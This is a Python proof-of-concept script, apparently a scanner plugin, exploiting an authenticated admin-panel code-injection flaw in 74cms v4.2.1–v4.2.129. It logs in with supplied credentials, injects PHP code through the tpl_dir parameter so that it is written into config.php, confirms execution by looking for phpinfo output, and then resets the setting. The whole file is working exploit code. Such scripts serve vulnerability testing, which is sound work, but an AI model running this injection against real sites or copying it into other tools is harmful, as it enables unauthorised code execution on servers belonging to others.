# coding: utf-8
import requests
from os import path

#74cms v4.2.1-v4.2.129-后台getshell漏洞
def poc(url,user_agent,logindict,proxy):

    url = url.strip("/")
    username = logindict.keys()
    password = logindict.values()
    logurl=url+'/index.php?m=admin&c=index&a=login'
    exp_url = url  + "/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),'"
    r_url = url + "/index.php?m=Admin&c=Tpl&a=set&tpl_dir=default "
    v_url=url+"/Application/Home/Conf/config.php"
    header = {'User-Agent': user_agent}
    session = requests.Session()

    data = {
        'username': username,
        'password': password,
        'geetest_challenge': '',
        'geetest_validate': '',
        'geetest_seccode': '',
        'token': ''
    }
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = session.post(logurl, headers=header, data=data, proxies=proxies)
    else:
        response = session.post(logurl, headers=header, data=data)

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response1 = session.get(exp_url, headers=header, proxies=proxies)
        response2 = session.get(v_url, headers=header, proxies=proxies)
        response3 = session.get(r_url, headers=header, proxies=proxies)


    else:
        response1 = session.get(exp_url, headers=header)
        response2 = session.get(v_url, headers=header)
        response3 = session.get(r_url, headers=header)


    if 'PHP Version' in response2.text:
        return '74cms v4.2.1-v4.2.129 - 后台getshell漏洞'


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url,user_agent,logindict,proxies)
        return result

